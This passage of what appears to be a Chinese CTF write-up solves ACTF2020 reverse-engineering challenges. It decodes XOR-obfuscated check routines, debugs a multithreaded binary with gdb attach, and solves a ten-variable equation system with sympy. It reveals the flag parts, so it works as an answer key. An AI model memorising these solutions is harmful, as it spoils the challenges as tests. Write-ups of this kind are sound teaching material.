v5;</span><br><span class="line">          JUMPOUT(__CS__, &amp;loc_405018[<span class="number">256</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Wrong\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><h3 id="0x0-确定flag结构"><a href="#0x0-确定flag结构" class="headerlink" title="0x0 确定flag结构"></a>0x0 确定flag结构</h3><p>flag长度为26字节，除去<code>ACTF{}</code>还剩下20字节的<code>flag</code>，使用<code>strtok</code>将20字节的<code>flag</code>分为三部分，其中有2字节是<code>_</code>，还剩下18字节分析一下，不难看出每部分6字节…</p><p>flag结构为<code>ACTF{123456_abcdef_ABCDEF}</code></p><h3 id="0x1-动态分析"><a href="#0x1-动态分析" class="headerlink" title="0x1 动态分析"></a>0x1 动态分析</h3><p>检查flag第一部分和第二部分的函数都在数据段，而且是经过异或编码的，于是只能动态调试</p><h4 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h4><p>第一部分的函数如下（解码前）：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_encode.png" data-fancybox="group" data-caption="p1_encode" class="fancybox"><img alt="p1_encode" title="p1_encode" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_encode.png" src="/img/loading.gif" class="lazyload"></a></p><p>这个函数解码的操作是异或<code>0x72</code>，解码后：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_decode.png" data-fancybox="group" data-caption="p1_dec" class="fancybox"><img alt="p1_dec" title="p1_dec" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_decode.png" src="/img/loading.gif" class="lazyload"></a></p><p>然后，直接去找字符比较的cmp指令：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_cmp.png" data-fancybox="group" data-caption="p1_cmp" class="fancybox"><img alt="p1_cmp" title="p1_cmp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p1_cmp.png" src="/img/loading.gif" class="lazyload"></a></p><p>输入的字符串是<code>ACTF{123456_abcdef_ABCDEF}</code>，这里是逐字节的明文对比，比较简单</p><p>对比6个字符后，能得到flag第一部分：<code>yOu0y*</code></p><h4 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h4><p>检查flag第二部分的函数需要通过刚解出的flag第一部分来解码，解码的操作是异或<code>yOu0y*</code>这六字节异或后的结果</p><p>因此，将输入的字符串改为<code>ACTF{yOu0y*_abcdef_ABCDEF}</code>，重新调试</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_cmp.png" data-fancybox="group" data-caption="p2_cmp" class="fancybox"><img alt="p2_cmp" title="p2_cmp" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_cmp.png" src="/img/loading.gif" class="lazyload"></a></p><p>这里不是明文对比，输入的<code>a</code>被加密成了<code>0xc1</code>，加密过程如下：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_enc.png" data-fancybox="group" data-caption="p2_encode" class="fancybox"><img alt="p2_encode" title="p2_encode" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_enc.png" src="/img/loading.gif" class="lazyload"></a></p><p>加密：</p><blockquote><p><code>y = eax[ ( x &amp; 0xff) ^ 0x83 + edi ]</code></p></blockquote><p>其中<code>edi</code>用作计数范围是0~5，<code>eax</code>可以看出是个数组：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_tbl.png" data-fancybox="group" data-caption="p2_map" class="fancybox"><img alt="p2_map" title="p2_map" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_tbl.png" src="/img/loading.gif" class="lazyload"></a></p><p>解密：</p><blockquote><p><code>x = eax.offset(y) ^ (0x83 + edi)</code></p></blockquote><p>其中<code>y</code>对应的是上上上面那张图中蓝框框起来的部分（数据夹在代码中hhhh）</p><blockquote><p><code>y = [0x30, 0x4, 0x4, 0x3, 0x30, 0x63]</code></p></blockquote><p>根据<code>y</code>的值查表，得到对应的偏移量，即可解得<code>x</code>：</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_dec.png" data-fancybox="group" data-caption="p2_dec" class="fancybox"><img alt="p2_dec" title="p2_dec" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p2_dec.png" src="/img/loading.gif" class="lazyload"></a></p><p>flag第二部分：<code>knowo3</code></p><h4 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h4><p>本来以为第三部分会更困难，没想到是直接用的<code>strcmp</code>明文对比…</p><p><a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p3_cmp.png" data-fancybox="group" data-caption="p3" class="fancybox"><img alt="p3" title="p3" data-src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/Splendid_MineCraft/p3_cmp.png" src="/img/loading.gif" class="lazyload"></a></p><p>flag第三部分：<code>5mcsM&lt;</code></p><h2 id="ding"><a href="#ding" class="headerlink" title="ding"></a>ding</h2><ul><li>题目描述：Ding! </li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/ding/ding" target="_blank" rel="noopener">ding</a></li><li>考察点：多线程、动态调试</li><li>难度：简单</li><li>分值：250</li><li>完成人数：1</li></ul><p>主要代码如下，其中<code>dest</code>位于<code>bss</code>段，<code>dest</code>函数在程序开启后初始化，所以静态分析不出来，要动态调</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">check</span><span class="params">(<span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> len_30; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(s) &lt;= <span class="number">0x10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !dest )</span><br><span class="line">    sleep(<span class="number">1000u</span>);</span><br><span class="line">  (dest)(s);</span><br><span class="line">  len_30 = <span class="built_in">strlen</span>(enc_flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len_30; ++i )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( i != len_30 - <span class="number">1</span> &amp;&amp; !s[i] || s[i] != enc_flag[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>由于用了多线程，直接用gdb调试的话不行</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0xb56</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/taqini/Downloads/actf/re/Ding/ding </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</span><br><span class="line">[Attaching after Thread 0xf7fcf600 (LWP 32676) fork to child process 32680]</span><br><span class="line">[New inferior 2 (process 32680)]</span><br><span class="line">[Detaching after fork from parent process 32676]</span><br><span class="line">--- The quick brown fox knocked at the lazy dog's house ---</span><br><span class="line">[?]Password please:</span><br><span class="line">[Inferior 1 (process 32676) detached]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".</span><br><span class="line">[New Thread 0xf7db0b40 (LWP 32685)]</span><br><span class="line">[Thread 0xf7db0b40 (LWP 32685) exited]</span><br><span class="line">[New Thread 0xf75afb40 (LWP 32686)]</span><br><span class="line">[Thread 0xf75afb40 (LWP 32686) exited]</span><br><span class="line">[Inferior 2 (process 32680) exited with code 01]</span><br></pre></td></tr></table></figure></div><p>所以改用<code>gdb attach</code>：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> ./ding </span></span><br><span class="line">--- The quick brown fox knocked at the lazy dog's house ---</span><br><span class="line">[?]Password please:</span><br><span class="line">^Z</span><br><span class="line">[1]  + 32732 suspended  ./ding</span><br><span class="line"></span><br><span class="line"><span class="meta">%</span><span class="bash"> <span class="built_in">fg</span></span></span><br><span class="line">[1]  + 32732 continued  ./ding</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash"> gdb attach 32732</span></span><br></pre></td></tr></table></figure></div><p>动态调试的时候为了方便分析，可以<code>dump</code>出<code>dest()</code>函数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> dump binary memory 0x565790e0 0x5657914b</span></span><br></pre></td></tr></table></figure></div><p>扔到ida里反编译：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl __noreturn <span class="title">sub_0</span><span class="params">(<span class="keyword">int</span> a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp-8h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) ^ <span class="number">0x47</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) + <span class="number">6</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = *(_BYTE *)(i + a1) - <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  JUMPOUT(MEMORY[<span class="number">0x6B</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>很简单的加密，解密即可：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#！/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line">enc_flag = [<span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x17</span>, <span class="number">0x05</span>, <span class="number">0x40</span>, <span class="number">0x37</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0x26</span>, <span class="number">0x2A</span>, <span class="number">0x27</span>, <span class="number">0x1C</span>, <span class="number">0x32</span>, <span class="number">0x76</span>, <span class="number">0x1C</span>, <span class="number">0x25</span>, <span class="number">0x36</span>, <span class="number">0x2D</span>, <span class="number">0x1C</span>, <span class="number">0x7E</span>, <span class="number">0x39</span>, <span class="number">0x2A</span>, <span class="number">0x2D</span>, <span class="number">0x27</span>, <span class="number">0x73</span>, <span class="number">0x7A</span>, <span class="number">0x6F</span>, <span class="number">0x7A</span>, <span class="number">0x72</span>, <span class="number">0x3E</span>]</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc_flag:</span><br><span class="line">    flag.append(chr((i+<span class="number">2</span><span class="number">-6</span>)^<span class="number">0x47</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(flag)</span><br></pre></td></tr></table></figure></div><p>这题也不难，不知道为啥也没人做…</p><h2 id="UniverseFinalAnswer"><a href="#UniverseFinalAnswer" class="headerlink" title="UniverseFinalAnswer"></a>UniverseFinalAnswer</h2><ul><li><p>题目描述：</p><blockquote><p>超级计算机“deep thought”用700万年的思考得出了宇宙终极问题的答案，但是答案却遗失了。而你则是需要从它的程序中找出终极答案到底是什么。</p></blockquote></li><li><p>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/re/UniverseFinalAnswer/UniverseFinalAnswer" target="_blank" rel="noopener">UniverseFinalAnswer</a></p></li><li><p>考察点：<strong>视力</strong>、解方程</p></li><li><p>难度：中等</p></li><li><p>分值：300</p></li><li><p>完成人数：3</p></li></ul><p>解十元一次方程组，输入的字符串作为十个变量，虽然flag由两部分组成，但是看程序逻辑，只要解方程对了就可以了：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-A8h]</span></span><br><span class="line">  <span class="keyword">char</span> key_string; <span class="comment">// [rsp+20h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Please give me the key string:"</span>, a3);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;key_string);</span><br><span class="line">  <span class="keyword">if</span> ( equation(&amp;key_string) )&#123;</span><br><span class="line">    key_xor_to_int_str(&amp;key_string, &amp;key_string, &amp;v4);</span><br><span class="line">    <span class="comment">// key_string 按位异或,再异或9，十进制结果转为字符串作为printf第4个参数,并没有什么用</span></span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Judgement pass! flag is actf&#123;%s_%s&#125;\n"</span>, &amp;key_string);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"False key!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>flag格式:<code>actf{part1_part2}</code></p><blockquote><p>part1:方程的十个变量<br>part2:十个变量异或再异或9后的结果</p></blockquote><h3 id="解方程"><a href="#解方程" class="headerlink" title="解方程"></a>解方程</h3><p>方程部分代码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">formal</span><span class="params">(<span class="keyword">char</span> *a1)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> x2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> x1; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> x3; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> x4; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">int</span> x5; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">int</span> x7; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> x6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> x8; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> x9; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">bool</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> x10; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  x2 = a1[<span class="number">1</span>];</span><br><span class="line">  x1 = *a1;</span><br><span class="line">  x3 = a1[<span class="number">2</span>];</span><br><span class="line">  x4 = a1[<span class="number">3</span>];</span><br><span class="line">  x5 = a1[<span class="number">4</span>];</span><br><span class="line">  x7 = a1[<span class="number">6</span>];</span><br><span class="line">  <span class="comment">// 此处想打出题人,x6,x7居然反着写，导致解方程一直不对，我debug了半天才找出来。。。</span></span><br><span class="line">  x6 = a1[<span class="number">5</span>];</span><br><span class="line">  x8 = a1[<span class="number">7</span>];</span><br><span class="line">  x9 = a1[<span class="number">8</span>];</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">-85</span> * x9 + <span class="number">58</span> * x8 + <span class="number">97</span> * x7 + x6 + <span class="number">-45</span> * x5 + <span class="number">84</span> * x4 + <span class="number">95</span> * x1 - <span class="number">20</span> * x2 + <span class="number">12</span> * x3 == <span class="number">12613</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    x10 = a1[<span class="number">9</span>];</span><br><span class="line">    <span class="keyword">if</span> ( <span class="number">30</span> * x10 + <span class="number">-70</span> * x9 + <span class="number">-122</span> * x7 + <span class="number">-81</span> * x6 + <span class="number">-66</span> * x5 + <span class="number">-115</span> * x4 + <span class="number">-41</span> * x3 + <span class="number">-86</span> * x2 - <span class="number">15</span> * x1 - <span class="number">30</span> * x8 == <span class="number">-54400</span></span><br><span class="line">      &amp;&amp; <span class="number">-103</span> * x10 + <span class="number">120</span> * x8 + <span class="number">108</span> * x6 + <span class="number">48</span> * x4 + <span class="number">-89</span> * x3 + <span class="number">78</span> * x2 - <span class="number">41</span> * x1 + <span class="number">31</span> * x5 - (x7 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * x9 == <span class="number">-10283</span></span><br><span class="line">      &amp;&amp; <span class="number">71</span> * x7 + (x6 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * x5 + <span class="number">-111</span> * x3 + <span class="number">85</span> * x2 + <span class="number">79</span> * x1 - <span class="number">30</span> * x4 - <span class="number">119</span> * x8 + <span class="number">48</span> * x9 - <span class="number">16</span> * x10 == <span class="number">22855</span></span><br><span class="line">      &amp;&amp; <span class="number">5</span> * x10 + <span class="number">23</span> * x9 + <span class="number">122</span> * x8 + <span class="number">-19</span> * x7 + <span class="number">99</span> * x6 + <span class="number">-117</span> * x5 + <span class="number">-69</span> * x3 + <span class="number">22</span> * x2 - <span class="number">98</span> * x1 + <span class="number">10</span> * x4 == <span class="number">-2944</span></span><br><span class="line">      &amp;&amp; <span class="number">-54</span> * x10 + <span class="number">-23</span> * x8 + <span class="number">-82</span> * x3 + <span class="number">-85</span> * x1 + <span class="number">124</span> * x2 - <span class="number">11</span> * x4 - <span class="number">8</span> * x5 - <span class="number">60</span> * x6 + <span class="number">95</span> * x7 + <span class="number">100</span> * x9 == <span class="number">-2222</span></span><br><span class="line">      &amp;&amp; <span class="number">-83</span> * x10 + <span class="number">-111</span> * x6 + <span class="number">-57</span> * x1 + <span class="number">41</span> * x2 + <span class="number">73</span> * x3 - <span class="number">18</span> * x4 + <span class="number">26</span> * x5 + <span class="number">16</span> * x7 + <span class="number">77</span> * x8 - <span class="number">63</span> * x9 == <span class="number">-13258</span></span><br><span class="line">      &amp;&amp; <span class="number">81</span> * x10 + <span class="number">-48</span> * x9 + <span class="number">66</span> * x8 + <span class="number">-104</span> * x7 + <span class="number">-121</span> * x6 + <span class="number">95</span> * x5 + <span class="number">85</span> * x4 + <span class="number">60</span> * x3 + <span class="number">-85</span> * x1 + <span class="number">80</span> * x2 == <span class="number">-1559</span></span><br><span class="line">      &amp;&amp; <span class="number">101</span> * x10 + <span class="number">-85</span> * x9 + <span class="number">7</span> * x7 + <span class="number">117</span> * x6 + <span class="number">-83</span> * x5 + <span class="number">-101</span> * x4 + <span class="number">90</span> * x3 + <span class="number">-28</span> * x2 + <span class="number">18</span> * x1 - x8 == <span class="number">6308</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">99</span> * x10 + <span class="number">-28</span> * x9 + <span class="number">5</span> * x8 + <span class="number">93</span> * x7 + <span class="number">-18</span> * x6 + <span class="number">-127</span> * x5 + <span class="number">6</span> * x4 + <span class="number">-9</span> * x3 + <span class="number">-93</span> * x2 + <span class="number">58</span> * x1 == <span class="number">-1697</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>提取出十个方程，用<code>python</code>解方程即可，这里比较坑的是出题人把<code>x6</code>和<code>x7</code>的顺序换了一下，不仔细看的话，会把这两个变量搞反。。。我就搞反了，debug的时候第一个方程总是解不对，曾一度怀疑是c语言运算出问题了。。。。（出题人，你过来，我不打你。嗯？哪里跑！）</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">x0,x1,x2,x3,x4,x5,x6,x7,x8,x9,x10 = sympy.symbols(<span class="string">"x0 x1 x2 x3 x4 x5 x6 x7 x8 x9 x10"</span>)</span><br><span class="line"></span><br><span class="line">b = sympy.solve(</span><br><span class="line">    [<span class="number">-85</span>*x9+<span class="number">58</span>*x8+<span class="number">97</span>*x7+x6+<span class="number">-45</span>*x5+<span class="number">84</span>*x4+<span class="number">95</span>*x1<span class="number">-20</span>*x2+<span class="number">12</span>*x3<span class="number">-12613</span>,</span><br><span class="line">    <span class="number">30</span>*x10+<span class="number">-70</span>*x9+<span class="number">-122</span>*x7+<span class="number">-81</span>*x6+<span class="number">-66</span>*x5+<span class="number">-115</span>*x4+<span class="number">-41</span>*x3+<span class="number">-86</span>*x2<span class="number">-15</span>*x1<span class="number">-30</span>*x8+<span class="number">54400</span>,</span><br><span class="line">    <span class="number">-103</span>*x10+<span class="number">120</span>*x8+<span class="number">108</span>*x6+<span class="number">48</span>*x4+<span class="number">-89</span>*x3+<span class="number">78</span>*x2<span class="number">-41</span>*x1+<span class="number">31</span>*x5-(x7*<span class="number">64</span>)<span class="number">-120</span>*x9+<span class="number">10283</span>,</span><br><span class="line">    <span class="number">71</span>*x7+(x6*<span class="number">128</span>)+<span class="number">99</span>*x5+<span class="number">-111</span>*x3+<span class="number">85</span>*x2+<span class="number">79</span>*x1<span class="number">-30</span>*x4<span class="number">-119</span>*x8+<span class="number">48</span>*x9<span class="number">-16</span>*x10<span class="number">-22855</span>,</span><br><span class="line">    <span class="number">5</span>*x10+<span class="number">23</span>*x9+<span class="number">122</span>*x8+<span class="number">-19</span>*x7+<span class="number">99</span>*x6+<span class="number">-117</span>*x5+<span class="number">-69</span>*x3+<span class="number">22</span>*x2<span class="number">-98</span>*x1+<span class="number">10</span>*x4+<span class="number">2944</span>,</span><br><span class="line">    <span class="number">-54</span>*x10+<span class="number">-23</span>*x8+<span class="number">-82</span>*x3+<span class="number">-85</span>*x1+<span class="number">124</span>*x2<span class="number">-11</span>*x4<span class="number">-8</span>*x5<span class="number">-60</span>*x6+<span class="number">95</span>*x7+<span class="number">100</span>*x9+<span class="number">2222</span>,</span><br><span class="line">    <span class="number">-83</span>*x10+<span class="number">-111</span>*x6+<span class="number">-57</span>*x1+<span class="number">41</span>*x2+<span class="number">73</span>*x3<span 